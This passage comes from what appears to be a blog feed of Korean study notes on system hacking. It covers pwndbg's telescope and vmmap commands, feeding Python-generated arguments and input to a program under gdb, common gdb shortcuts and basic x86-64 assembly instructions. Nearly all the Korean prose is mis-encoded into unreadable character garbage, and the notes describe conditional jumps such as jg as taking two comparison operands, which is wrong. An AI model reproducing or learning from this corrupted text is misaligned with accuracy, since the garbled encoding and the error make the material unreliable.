&lt;h2 id=&quot;telescope&quot;&gt;telescope&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;pwndbgê°€ ì œê³µí•˜ëŠ” ë©”ëª¨ë¦¬ ë¤í”„ ê¸°ëŠ¥. ë©”ëª¨ë¦¬ê°€ ì°¸ì¡°í•˜ê³  ìˆëŠ” ì£¼ì†Œë¥¼ ì¬ê·€ì ìœ¼ë¡œ íƒìƒ‰í•´ ê°’ì„ ë³´ì—¬ì£¼ê¸°ê¹Œì§€ í•¨!&lt;/li&gt;
  &lt;li&gt;í˜„ì¬ ë³´ì´ëŠ” ì´ ê°’ì´ ì–´ë–¤ ì£¼ì†Œì—ì„œ ì–´ë–»ê²Œ ì‚¬ìš©ë˜ëŠ”ì§€ê¹Œì§€ ì•Œ ìˆ˜ ìˆìœ¼ë¯€ë¡œ êµ‰ì¥íˆ ìœ ìš©í•˜ë‹¤.
    &lt;ul&gt;
      &lt;li&gt;
        &lt;p&gt;rsp ê¸°ì¤€ìœ¼ë¡œ 8ê°œì˜ ë©”ëª¨ë¦¬ ì£¼ì†Œë¥¼ ë³´ì—¬ì£¼ê¸° ë•Œë¬¸ì— ì½œìŠ¤íƒì˜ ì—­ì‚¬ë¥¼ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%206.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;vmmap&quot;&gt;vmmap&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ê°€ìƒ ë©”ëª¨ë¦¬ì˜ ë ˆì´ì•„ì›ƒì„ ë³´ì—¬ì£¼ë©°, ì–´ë–¤ íŒŒì¼ì´ ë§¤í•‘ëœ ì˜ì—­ì¼ ë•Œ í•´ë‹¹ íŒŒì¼ì˜ ê²½ë¡œê¹Œì§€ ë³´ì—¬ì¤Œ.&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;cat /proc/{pid}/mapsì™€ ë™ì¼í•œ ì¼ì„ í•œë‹¤. ë¬¼ë¡  ê°€ë…ì„±ì€ í›¨ì”¬ ì¢‹ë‹¤.&lt;/p&gt;

    &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%207.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;aside&gt;
âš™ íŒŒì¼ ë§¤í•‘:

- ì–´ë–¤ íŒŒì¼ì„ ë©”ëª¨ë¦¬ì— ì ì¬í•˜ëŠ” ê²ƒ.
- ë¦¬ëˆ…ìŠ¤ì—ì„œ ELFë¥¼ ì‹¤í–‰í•  ë•Œì˜ ê³¼ì •:
    1. ELF ìì²´ì˜ ì½”ë“œ, ë°ì´í„° ë“±ì„ ê°€ìƒ ë©”ëª¨ë¦¬ì— ë§¤í•‘ 
    2. í•´ë‹¹ ELFì— ë§í¬ëœ ê³µìœ  ì˜¤ë¸Œì íŠ¸(.so)ë¥¼ ì¶”ê°€ë¡œ ë©”ëª¨ë¦¬ì— ë§¤í•‘
        - ë¦¬ëˆ…ìŠ¤ì˜ so = ìœˆë„ìš°ì˜ dll
    3. soì— êµ¬í˜„ëœ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•  ë• ë§¤í•‘ëœ ë©”ëª¨ë¦¬ì— ì¡´ì¬í•˜ëŠ” í•¨ìˆ˜ë¥¼ ëŒ€ì‹  í˜¸ì¶œ(ë©”ëª¨ë¦¬ì— ì ì¬ëœ so ë‚´ë¶€ì˜ í•¨ìˆ˜ë¥¼ í˜¸ì¶œ)
&lt;/aside&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;gdbpython&quot;&gt;gdb/python&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;gdbë¥¼ ì´ìš©í•´ ë””ë²„ê¹… ì‹œ, ìˆ«ì/ì•ŒíŒŒë²³ ì´ì™¸ì˜ ê°’ì€ ì…ë ¥ê°’ìœ¼ë¡œ ì§ì ‘ ì…ë ¥í•´ì¤„ ìˆ˜ ì—†ëŠ” ë¬¸ì œê°€ ìˆë‹¤.&lt;/li&gt;
  &lt;li&gt;ì²«ë²ˆì§¸ ë°©ì‹: python argv
    &lt;ul&gt;
      &lt;li&gt;ëª©í‘œ í”„ë¡œê·¸ë¨ì— gdbë¥¼ ë¶™ì´ê³  r ëª…ë ¹ì–´ì˜ ì¸ìë¡œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$({ì›í•˜ëŠ” ë‚´ìš©ì„ ì¤„ ìˆ˜ ìˆëŠ” íŒŒì´ì¬ ì½”ë“œ})&lt;/code&gt; ë¥¼ ì…ë ¥í•˜ë©´ í”„ë¡œê·¸ë¨ì˜ &lt;strong&gt;â€˜ì¸ìâ€™&lt;/strong&gt;ë¥¼ ì „ë‹¬í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ì‚¬ìš©ì˜ˆ:&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%208.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ë‘ë²ˆì§¸ ë°©ì‹: python input
    &lt;ul&gt;
      &lt;li&gt;ëª©í‘œ í”„ë¡œê·¸ë¨ì— gdbë¥¼ ë¶™ì´ê³ , r ëª…ë ¹ì–´ì˜ ì¸ìë¡œ &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;&amp;lt;&amp;lt; $({íŒŒì´ì¬ ì½”ë“œ})&lt;/code&gt; ë¥¼ ì…ë ¥í•˜ë©´ í”„ë¡œê·¸ë¨ ì‹¤í–‰ ì¤‘ì— ë°›ëŠ” &lt;strong&gt;â€˜ì…ë ¥ê°’â€™&lt;/strong&gt;ì„ ë¯¸ë¦¬ ì „ë‹¬í•  ìˆ˜ ìˆë‹¤.&lt;/li&gt;
      &lt;li&gt;
        &lt;p&gt;ì‚¬ìš©ì˜ˆ: *(í•´ë‹¹ í”„ë¡œê·¸ë¨ì€ ì¸ìì™€ ì…ë ¥ê°’ ëª¨ë‘ë¥¼ ìš”êµ¬í•˜ê¸° ë•Œë¬¸ì— ì²«ë²ˆì§¸ ë°©ì‹ê³¼ ë‘ë²ˆì§¸ ë°©ì‹ì´ í•¨ê»˜ ì“°ì˜€ë‹¤.)&lt;/p&gt;

        &lt;p&gt;&lt;img src=&quot;/assets/img/syshack3-1/Untitled%209.jpeg&quot; alt=&quot;Untitled&quot; /&gt;&lt;/p&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;ê·¸-ì™¸-ìì£¼-ì‚¬ìš©ë˜ëŠ”-ëª…ë ¹ì–´ë“¤ê³¼-ê·¸-ë‹¨ì¶•í‚¤&quot;&gt;ê·¸ ì™¸ ìì£¼ ì‚¬ìš©ë˜ëŠ” ëª…ë ¹ì–´ë“¤ê³¼, ê·¸ ë‹¨ì¶•í‚¤&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;b: break&lt;/li&gt;
  &lt;li&gt;c: continue&lt;/li&gt;
  &lt;li&gt;r: run&lt;/li&gt;
  &lt;li&gt;si: step into
    &lt;ul&gt;
      &lt;li&gt;ì–´ë–¤ í•¨ìˆ˜ ì•ˆìœ¼ë¡œ ë“¤ì–´ê°€ëŠ” ê²ƒì´ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;ni: next instruction
    &lt;ul&gt;
      &lt;li&gt;ëª…ë ¹ì–´ë¥¼ ë”± í•œ ì¤„ ë” ì‹¤í–‰í•˜ëŠ” ê²ƒì´ë‹¤.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;i: info
    &lt;ul&gt;
      &lt;li&gt;ì ‘ë‘ì–´ë¡œ ì£¼ë¡œ ì‚¬ìš©ë˜ê³ , ì ‘ë¯¸ë¡œ ë¶™ëŠ” ìš”ì†Œì˜ ì •ë³´ë¥¼ í™•ì¸í•˜ëŠ” ë° ì‚¬ìš©ëœë‹¤.&lt;/li&gt;
      &lt;li&gt;ì˜ˆì‹œ: info b (í˜„ì¬ ë¸Œë ˆì´í¬ í¬ì¸íŠ¸ ë³´ê¸°)&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;k: kill
    &lt;ul&gt;
      &lt;li&gt;kill process&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;pd: pdisas
    &lt;ul&gt;
      &lt;li&gt;ê¸°ì¡´ gdb ëª…ë ¹ì–´ì˜ peda ë²„ì „ìœ¼ë¡œ, disasì˜ í™•ì¥íŒì´ë‹¤.&lt;/li&gt;
      &lt;li&gt;í™”ë©´ì´ ì¢€ ë” ì˜ˆì˜ê²Œ, ê°€ë…ì„± ì¢‹ê²Œ ë‚˜ì˜¨ë‹¤. &lt;del&gt;ê¸°ë¶€ë‹ˆê°€ ì¡°í¬ë“ ìš”&lt;/del&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

</description>
        <pubDate>Sun, 10 Jul 2022 21:10:23 +0900</pubDate>
        <link>http://localhost:4000/blog/system-hacking-step3-1/</link>
        <guid isPermaLink="true">http://localhost:4000/blog/system-hacking-step3-1/</guid>
      </item>
    
      <item>
        <title>System Hackig Step 2-2</title>
        <description>&lt;h1 id=&quot;stage-2&quot;&gt;STAGE 2&lt;/h1&gt;

&lt;h1 id=&quot;x86-assembly-part-1&quot;&gt;x86 Assembly: Part 1&lt;/h1&gt;

&lt;p&gt;&lt;em&gt;ë¦¬ë²„ì‹± ê³µë¶€í•˜ë©´ì„œ ì´ë¯¸ í–ˆë˜ ê±°ë¼ ì—¬ê¸°ì—ì„œëŠ” ê°„ë‹¨í•˜ê²Œ ë©”ëª¨ë§Œ í•˜ê³  ë„˜ì–´ê°‘ë‹ˆë‹¤.&lt;/em&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ì–´ì…ˆë¸”ë¦¬ì–´ â†’ (by ì–´ì…ˆë¸”ëŸ¬) â†’ ê¸°ê³„ì–´&lt;/li&gt;
  &lt;li&gt;ì—­ì–´ì…ˆë¸”ëŸ¬ â†”Â  ì–´ì…ˆë¸”ëŸ¬
    &lt;ul&gt;
      &lt;li&gt;ì¦‰, ì—­ì–´ì…ˆë¸”ëŸ¬ëŠ” ê¸°ê³„ì–´ â†’ ì–´ì…ˆë¸”ë¦¬ì–´. ìš°ë¦¬ê°€ ë¦¬ë²„ì‹± í•  ë•Œ ì—†ìœ¼ë©´ ì•ˆë˜ëŠ” ê²ƒ!&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;ì–´ì…ˆë¸”ë¦¬ì–´ì™€-x86-64&quot;&gt;ì–´ì…ˆë¸”ë¦¬ì–´ì™€ x86-64&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;ìš”ì•½&gt;

- CPUì˜ ISA(Instruction Set Architecture) ì¢…ë¥˜ë³„ë¡œ ì–´ì…ˆë¸”ë¦¬ì–´ê°€ ë‹¤ë¥´ë‹¤.
- ì—¬ê¸°ì—ì„œ ë‹¤ë£° ì–´ì…ˆë¸”ë¦¬ì–´ëŠ” x64 ì–´ì…ˆë¸”ë¦¬ì–´.
&lt;/ìš”ì•½&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;ì–´ì…ˆë¸”ë¦¬ì–´ì˜-ê¸°ë³¸-êµ¬ì¡°&quot;&gt;ì–´ì…ˆë¸”ë¦¬ì–´ì˜ ê¸°ë³¸ êµ¬ì¡°&lt;/h3&gt;

&lt;aside&gt;
ğŸ’¡ OpCode    Operand1, Operand2

&lt;/aside&gt;

&lt;p&gt;ex) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mov   eax, 3&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;ì–´ì…ˆë¸”ë¦¬-ëª…ë ¹ì–´--ì¤‘-ì•Œì•„ë‘ë©´-ì¢‹ì„-ê²ƒ&quot;&gt;ì–´ì…ˆë¸”ë¦¬ ëª…ë ¹ì–´  ì¤‘ ì•Œì•„ë‘ë©´ ì¢‹ì„ ê²ƒ&lt;/h3&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;ëª…ë ¹ ì½”ë“œ&lt;/th&gt;
      &lt;th&gt;Â &lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Data Transfer&lt;/td&gt;
      &lt;td&gt;mov, lea&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Arithmetic&lt;/td&gt;
      &lt;td&gt;inc, dec, add, sub&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Logical&lt;/td&gt;
      &lt;td&gt;and, or, xor, not&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Comparison&lt;/td&gt;
      &lt;td&gt;cmp, test&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Branch&lt;/td&gt;
      &lt;td&gt;jmp, je, jg&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Stack&lt;/td&gt;
      &lt;td&gt;push, pop&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Procedure&lt;/td&gt;
      &lt;td&gt;call, ret, leave&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;System call&lt;/td&gt;
      &lt;td&gt;syscall&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;ì–´ì…ˆë¸”ë¦¬-ëª…ë ¹ì–´ì˜-í”¼ì—°ì‚°ì&quot;&gt;ì–´ì…ˆë¸”ë¦¬ ëª…ë ¹ì–´ì˜ í”¼ì—°ì‚°ì&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;â€œì´ 3ê°€ì§€ ì¢…ë¥˜â€&lt;/strong&gt;&lt;/p&gt;

  &lt;ol&gt;
    &lt;li&gt;ìƒìˆ˜(Immediate Value): {immediate_value}&lt;/li&gt;
    &lt;li&gt;ë ˆì§€ìŠ¤í„°(Register): {register_name}&lt;/li&gt;
    &lt;li&gt;ë©”ëª¨ë¦¬(Memory): &lt;strong&gt;[{memory_address}] â€¦&lt;/strong&gt; &lt;em&gt;ëª°ëìŒ!!&lt;/em&gt;
      &lt;ul&gt;
        &lt;li&gt;&lt;strong&gt;ì•ì— í¬ê¸° ì§€ì •ì(Size Directive)ì¸ TYPE PTR ì¶”ê°€ë  ìˆ˜ ìˆë‹¤.&lt;/strong&gt;&lt;/li&gt;
        &lt;li&gt;BYTE(1 byte), WORD(2 byte), DWORD(4 byte), QWORD(8 byte)
          &lt;ul&gt;
            &lt;li&gt;WORDê°€ 2 byteì¸ ì´ìœ : ë§¨ ì²˜ìŒ ì¸í…”ì˜ ì•„í‚¤í…ì²˜ê°€ 16ë¹„íŠ¸ì˜€ëŠ”ë°, ë‚˜ì¤‘ì— ì•„í‚¤í…ì²˜ í™•ì¥ ê³¼ì •ì„ ê±°ì¹˜ë‹¤ ë³´ë‹ˆ WORD ìë£Œí˜• í¬ê¸°ë¥¼ ë³€ê²½í•´ ë²„ë¦¬ë©´ ë‹¤ë¥¸ ì•„í‚¤í…ì²˜ì—ì„œ í”„ë¡œê·¸ë¨ í˜¸í™˜ì´ ì•ˆ ë˜ëŠ” ë¬¸ì œê°€ ìƒê²¨ì„œ ê·¸ëƒ¥ 16ë¹„íŠ¸ ìœ ì§€.&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;x86-64-ì–´ì…ˆë¸”ë¦¬-ëª…ë ¹ì–´&quot;&gt;x86-64 ì–´ì…ˆë¸”ë¦¬ ëª…ë ¹ì–´&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;ë¦¬ë²„ì‹±ê³¼ ì‹œìŠ¤í…œ í•´í‚¹ì˜ ì›ë¦¬ì—ì„œ ê³µë¶€í–ˆë˜ ë‚´ìš©ì´ë¯€ë¡œ ê°„ëµíˆ ì •ë¦¬í•˜ê³  ë„˜ì–´ê°.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;ë°ì´í„°-ì´ë™-ëª…ë ¹ì–´&quot;&gt;ë°ì´í„° ì´ë™ ëª…ë ¹ì–´&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;mov dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;srcì˜ ê°’ì„ dstì— ì´ë™.&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;lea dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;srcì˜ &lt;strong&gt;ìœ íš¨ ì£¼ì†Œ&lt;/strong&gt;ë¥¼ dstì— ì €ì¥.&lt;/li&gt;
    &lt;li&gt;ì¦‰, srcëŠ” memory íƒ€ì…ì˜ í”¼ì—°ì‚°ìë¡œ ì˜¤ê²Œ ëœë‹¤.
      &lt;ul&gt;
        &lt;li&gt;ex) lea rsi, [rbx+8&lt;em&gt;rcx]: rbx+8&lt;/em&gt;rcxë¥¼ rsiì— ëŒ€ì…í•œë‹¤.&lt;/li&gt;
        &lt;li&gt;ë§ì´ í—·ê°ˆë¦¬ë‹ˆê¹Œ ì£¼ì˜!!!&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;ì‚°ìˆ -ì—°ì‚°-ëª…ë ¹ì–´&quot;&gt;ì‚°ìˆ  ì—°ì‚° ëª…ë ¹ì–´&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;add dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst+=src&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;sub dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst-=src&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;inc op&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op ++&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;dec op&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op â€“&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;ë…¼ë¦¬-ì—°ì‚°-ëª…ë ¹ì–´&quot;&gt;ë…¼ë¦¬ ì—°ì‚° ëª…ë ¹ì–´&lt;/h3&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;and&lt;/strong&gt; dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst&amp;amp;=src&lt;/li&gt;
    &lt;li&gt;&lt;strong&gt;ë§ˆìŠ¤í‚¹&lt;/strong&gt; ì—°ì‚°
      &lt;ul&gt;
        &lt;li&gt;eax=0xffff, ebx=0xcafeì¼ ë•Œ, and eax, ebxë¥¼ ì‹œí–‰í•˜ë©´ eax=0xcafe&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;or&lt;/strong&gt; dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;
      &lt;table&gt;
        &lt;tbody&gt;
          &lt;tr&gt;
            &lt;td&gt;dst&lt;/td&gt;
            &lt;td&gt;=src&lt;/td&gt;
          &lt;/tr&gt;
        &lt;/tbody&gt;
      &lt;/table&gt;
    &lt;/li&gt;
    &lt;li&gt;&lt;strong&gt;ì—­ ë§ˆìŠ¤í‚¹&lt;/strong&gt; ì—°ì‚°
      &lt;ul&gt;
        &lt;li&gt;eax=0xffff0000, ebx=0xdeadbeefì¼ ë•Œ, or eax, ebxë¥¼ ì‹œí–‰í•˜ë©´ eax=0xffffbeef&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;xor dst, src&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;dst^=src&lt;/li&gt;
    &lt;li&gt;ë¹„íŠ¸ê°€ ë‹¤ë¥´ë©´ 1, ê°™ìœ¼ë©´ 0&lt;/li&gt;
    &lt;li&gt;ë”°ë¼ì„œ, xor ì—°ì‚°ì„ ë™ì¼í•œ ê°’ìœ¼ë¡œ ë‘ ë²ˆ ì‹¤í–‰í•  ê²½ìš°, ì›ë˜ ê°’ìœ¼ë¡œ ëŒì•„ê°.
      &lt;ul&gt;
        &lt;li&gt;ex) rax=0x35014541, rbx=0xdeadbeefì¼ ë•Œ,
          &lt;ul&gt;
            &lt;li&gt;xor rax, rbx ì‹œí–‰ í›„ rax=0xebacfbae&lt;/li&gt;
            &lt;li&gt;ë˜ ë‹¤ì‹œ xor rax, rbx ì‹œí–‰í•˜ë©´ rax=0x35014541&lt;/li&gt;
          &lt;/ul&gt;
        &lt;/li&gt;
        &lt;li&gt;ì´ëŸ° ì„±ì§ˆì„ ì´ìš©í•´ XOR cipherê°€ ê°œë°œ(ë¸”ë¡ ì•”í˜¸í™”ì—ì„œë„ XORì˜ ì„±ì§ˆì„ ì´ìš©í•´ì„œ ì•”í˜¸í™”í•˜ëŠ” ë°©ì‹ì´ ë§ì€ ê²ƒìœ¼ë¡œ ê¸°ì–µí•¨!)&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;not op&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;~(op) ì¦‰, opì˜ ë¹„íŠ¸ ì „ë¶€ ë°˜ì „(1ì˜ ë³´ìˆ˜)&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code class=&quot;language-wasm&quot;&gt;xor rax, rbx
xor rax, rbx
not eax
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ë¥¼ ìˆ˜í–‰í–ˆì„ ë•Œ, ë§¨ ë§ˆì§€ë§‰ì˜ not eaxê¹Œì§€ë¥¼ ìˆ˜í–‰í•˜ë©´ raxì˜ í•˜ìœ„ 32ë¹„íŠ¸ê°€ 1ì˜ ë³´ìˆ˜ë¥¼ ì·¨í•˜ì—¬ ë‹¤ì‹œ raxì˜ í•˜ìœ„ 32ë¹„íŠ¸ë¥¼ ì±„ìš°ê²Œ ëœë‹¤. raxì˜ í•˜ìœ„ 32ë¹„íŠ¸ê°€ eaxì´ê³ , ì‹¤ì œë¡œ ê·¸ë ‡ê²Œ ì‚¬ìš©í•  ìˆ˜ ìˆë‹¤ëŠ” ì  ìŠì§€ ë§ì!&lt;/p&gt;

&lt;h3 id=&quot;ë¹„êµ-ì—°ì‚°-ëª…ë ¹ì–´&quot;&gt;ë¹„êµ ì—°ì‚° ëª…ë ¹ì–´&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;â€œë‘ í”¼ì—°ì‚°ìì˜ ê°’ì„ ë¹„êµí•˜ê³ , í”Œë˜ê·¸ë¥¼ ì„¤ì •í•œë‹¤.â€&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;cmpì™€ testì˜ ë¹„êµëŠ” ë¦¬ë²„ì‹±ì„ ê³µë¶€í•  ë•Œ ë§ì´ í—·ê°ˆë ¸ë˜ ë¶€ë¶„ì´ë‹¤. ì£¼ì˜í•˜ì!&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;cmp op1, op2&lt;/strong&gt;&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op1ê³¼ op2ë¥¼ ë¹„êµí•œë‹¤.&lt;/li&gt;
    &lt;li&gt;â€œë¹¼ì„œâ€ ë¹„êµí•œë‹¤.&lt;/li&gt;
    &lt;li&gt;ì—°ì‚°ì˜ ê²°ê³¼ëŠ” ZFì— ì„¤ì •ëœë‹¤.&lt;/li&gt;
    &lt;li&gt;ë³´í†µ â€œê°™ì€ì§€â€ í™•ì¸í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•œë‹¤.
      &lt;ul&gt;
        &lt;li&gt;ê°™ë‹¤ë©´ ZF=1ë¡œ ì„¤ì •ë˜ê³ , jmp ë¶„ê¸°ë¬¸ì—ì„œ ì„¤ì •ì— ë”°ë¼ ì½”ë“œ í”Œë¡œìš°ë¥¼ ë¶„ê¸°ì‹œí‚¤ê²Œ ëœë‹¤.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;test op1, op2&lt;/strong&gt;&lt;/p&gt;

  &lt;ul&gt;
    &lt;li&gt;op1ê³¼ op2ë¥¼ ë¹„êµí•œë‹¤.&lt;/li&gt;
    &lt;li&gt;â€œANDâ€ë¥¼ ì·¨í•´ ë¹„êµí•œë‹¤.&lt;/li&gt;
    &lt;li&gt;ì—°ì‚°ì˜ ê²°ê³¼ëŠ” ZFì— ì„¤ì •ëœë‹¤.&lt;/li&gt;
    &lt;li&gt;ë³´í†µ â€œìê¸° ìì‹ ì´â€ 0ì´ì—ˆëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•œë‹¤.
      &lt;ul&gt;
        &lt;li&gt;ìì‹ ì´ 0ì´ì—ˆë‹¤ë©´ ZF=1ë¡œ ì„¤ì •ëœë‹¤.&lt;/li&gt;
      &lt;/ul&gt;
    &lt;/li&gt;
    &lt;li&gt;ì™œëƒí•˜ë©´ ìê¸° ìì‹ ê³¼ ANDë¥¼ ì·¨í–ˆì„ ë•Œ 0ì´ ë‚˜ì˜¬ ìˆ˜ ìˆëŠ” ê²½ìš°ëŠ” ì˜¤ë¡œì§€ ìê¸° ìì‹ ì´ 0ì¼ ë•Œ ë¿ì´ë¯€ë¡œ!&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h3 id=&quot;ë¶„ê¸°-ëª…ë ¹ì–´&quot;&gt;ë¶„ê¸° ëª…ë ¹ì–´&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;â€œripë¥¼ ì´ë™ì‹œì¼œ ì‹¤í–‰ íë¦„ì„ ë°”ê¾¼ë‹¤!â€&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ë¦¬ë²„ì‹±ì„ í•  ë•Œ ì •ë§ ì˜ ì•Œì•„ë‘¬ì•¼ í•œë‹¤. ì™œëƒí•˜ë©´ ë³´í†µì˜ í”„ë¡œê·¸ë¨ë“¤ì€ ë¶„ê¸°ì— ë”°ë¥¸ ê²½ìš°ìˆ˜ë¥¼ ê¸°ë°˜ìœ¼ë¡œ í–‰ë™ì„ í•˜ê¸° ë•Œë¬¸ì´ë‹¤.&lt;/p&gt;

&lt;p&gt;ripê°€ ì´ë™ë˜ëŠ” ì´ìœ ëŠ” ì»´í“¨í„° ì•„í‚¤í…ì²˜ë¥¼ ê³µë¶€í•œ ì  ìˆë‹¤ë©´ ì•Œ ìˆ˜ ìˆë‹¤.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CPUëŠ” jmpë“±ì˜ ë¶„ê¸°ë¬¸ì„ ë§Œë‚˜ë©´ PCì— ì €ì¥ëœ ë‹¤ìŒ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ ì£¼ì†Œë¥¼ ë°”ê¿”ì„œ jmp ëª…ë ¹ì–´ê°€ ê°€ë¦¬í‚¤ëŠ” ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì„ ìˆ˜í–‰í•˜ê²Œ ë˜ëŠ”ë°, ì´ë•Œ PCê°€ ripì´ê¸° ë•Œë¬¸ì— ë¶„ê¸° ëª…ë ¹ì–´ëŠ” ê²°ë¡ ì ìœ¼ë¡œ ripë¥¼ ì´ë™ì‹œì¼œ ì‹¤í–‰ íë¦„ì„ ë°”ê¾¸ê²Œ ëœë‹¤.&lt;/li&gt;
  &lt;li&gt;jmp ê³„ì—´ ëª…ë ¹ì–´ëŠ” jmp op1, op2ì¼ ë•Œ op1ì„ ê¸°ì¤€ìœ¼ë¡œ ì´ë¦„ì„ ë¶™ì´ê²Œ ëœë‹¤.
    &lt;ul&gt;
      &lt;li&gt;ex) jg op1, op2 // jump if op1 is greater than op2&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;x86-assembly-part-2&quot;&gt;x86 Assembly: Part 2&lt;/h1&gt;

